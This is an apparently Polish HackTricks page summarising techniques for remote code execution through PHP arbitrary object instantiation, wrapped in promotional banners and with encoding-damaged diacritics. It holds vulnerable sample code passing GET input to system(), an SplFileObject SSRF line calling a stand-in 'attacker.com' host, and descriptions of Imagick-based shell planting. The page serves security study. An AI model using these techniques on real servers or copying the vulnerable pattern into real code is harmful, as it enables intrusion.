# PHP - RCE wykorzystujce tworzenie obiekt贸w: new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

To jest w zasadzie podsumowanie [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Wprowadzenie

Tworzenie nowych dowolnych obiekt贸w, takich jak `new $_GET["a"]($_GET["a"])`, mo偶e prowadzi do wykonania zdalnego kodu (RCE), jak szczeg贸owo opisano w [**artykule**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Ten dokument przedstawia r贸偶ne strategie osigania RCE.

## RCE za pomoc niestandardowych klas lub autoloadingu

Skadnia `new $a($b)` jest u偶ywana do tworzenia obiektu, gdzie **`$a`** reprezentuje nazw klasy, a **`$b`** jest pierwszym argumentem przekazywanym do konstruktora. Te zmienne mog pochodzi z danych wprowadzanych przez u偶ytkownika, takich jak GET/POST, gdzie mog by cigami znak贸w lub tablicami, lub z JSON, gdzie mog by innymi typami.

Przykad kodu poni偶ej:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
W tym przypadku ustawienie `$a` na `App` lub `App2` oraz `$b` na polecenie systemowe (np. `uname -a`) powoduje wykonanie tego polecenia.

Funkcje **Autoloading** mog by wykorzystane, jeli nie ma bezporedniego dostpu do takich klas. Te funkcje automatycznie wczytuj klasy z plik贸w, gdy s potrzebne i s definiowane za pomoc `spl_autoload_register` lub `__autoload`:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Zachowanie autoloadingu r贸偶ni si w zale偶noci od wersji PHP, oferujc r贸偶ne mo偶liwoci RCE.

## RCE za pomoc wbudowanych klas

Brak wasnych klas lub autoloaders贸w mo偶e wystarczy do RCE za pomoc **wbudowanych klas PHP**. Liczba tych klas waha si od 100 do 200, w zale偶noci od wersji PHP i rozszerze. Mog by one wymienione za pomoc `get_declared_classes()`.

Konstruktory, kt贸re nas interesuj, mo偶na zidentyfikowa za pomoc interfejsu refleksji, jak pokazano w poni偶szym przykadzie i na stronie [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**RCE za pomoc konkretnych metod obejmuje:**

### **SSRF + deserializacja Phar**

Klasa `SplFileObject` umo偶liwia SSRF za pomoc swojego konstruktora, pozwalajc na poczenia do dowolnego adresu URL:
```php
new SplFileObject('http://attacker.com/');
```
SSRF mo偶e prowadzi do atak贸w deserializacji w wersjach PHP przed 8.0, korzystajc z protokou Phar.

### **Wykorzystywanie PDOs**

Konstruktor klasy PDO umo偶liwia poczenia z bazami danych za pomoc cig贸w DSN, co potencjalnie umo偶liwia tworzenie plik贸w lub inne interakcje:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Wersje PHP do 5.3.22 i 5.4.12 byy podatne na ataki XXE poprzez konstruktory `SoapClient` i `SimpleXMLElement`, w zale偶noci od wersji libxml2.

## RCE za pomoc rozszerzenia Imagick

Podczas analizy **zale偶noci projektu** odkryto, 偶e **Imagick** mo偶e by wykorzystany do **wykonywania polece** poprzez tworzenie nowych obiekt贸w. Daje to mo偶liwo wykorzystania podatnoci.

### Analizator VID

Zidentyfikowano mo偶liwo analizatora VID do zapisywania zawartoci w okrelonej cie偶ce w systemie plik贸w. Mo偶e to prowadzi do umieszczenia powoki PHP w katalogu dostpnym przez sie, co umo偶liwia zdalne wykonanie kodu (RCE).

#### Analizator VID + Przesyanie plik贸w

Zauwa偶ono, 偶e PHP tymczasowo przechowuje przesane pliki w `/tmp/phpXXXXXX`. Analizator VID w Imagick, wykorzystujcy protok贸 **msl**, mo偶e obsugiwa symbole wieloznaczne w cie偶kach plik贸w, uatwiajc przeniesienie tymczasowego pliku do wybranej lokalizacji. Ta metoda oferuje dodatkowe podejcie do osignicia dowolnego zapisu plik贸w w systemie plik贸w.

### PHP Crash + Brute Force

Metoda opisana w [**oryginalnym opracowaniu**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) polega na przesyaniu plik贸w, kt贸re powoduj awari serwera przed usuniciem. Poprzez brutalne pr贸bowanie nazwy tymczasowego pliku, mo偶liwe staje si wykonanie dowolnego kodu PHP przez Imagick. Jednak ta technika okazaa si skuteczna tylko w przestarzaej wersji ImageMagick.

## Odwoania

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
